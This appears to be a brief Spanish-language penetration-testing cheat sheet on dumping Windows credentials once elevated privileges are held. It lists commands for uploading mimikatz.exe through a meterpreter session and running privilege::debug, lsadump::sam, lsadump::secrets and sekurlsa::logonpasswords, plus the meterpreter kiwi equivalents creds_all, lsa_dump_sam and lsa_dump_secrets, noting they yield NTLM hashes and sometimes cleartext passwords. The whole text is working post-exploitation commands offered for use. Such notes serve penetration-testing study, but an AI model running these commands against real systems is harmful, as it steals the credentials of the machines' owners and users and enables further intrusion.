dumpear contraseñas en hash, se debe tener privilegios elevados

Uso desde ejecutable mimikatz, desde session de meterpreter
```
primero subir ejecutable a equipo atacado
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
```

```
.\mimikatz.exe -> entrar a consola de mimikatz
privilege::debug -> valida privilegios para ver si puedo hacer dumpeos

lsdump::sam -> dumpeo de credenciales NTLM del sistema. provee el SYSKEY y SAMKEY para desencriptar contraseñas
lsdump::secrets -> a veces da credenciales en texto claro

sekurlsa::logonpasswords -> revisa logs, pudiendo entregar credenciales en texto claro
```

Opcion teniendo sesion de meterpreter y privilegios de NT AUTHORITY/SYSTEM
```
meterpreter > load kiwi
meterpreter > creds_all -> dumpeo de todas las credenciales
meterpreter > lsa_dump_sam -> dumpeo de credenciales NTLM del sistema. provee el SYSKEY y SAMKEY para desencriptar contraseñas
meterpreter > lsa_dump_secrets -> a veces da credenciales en texto claro

```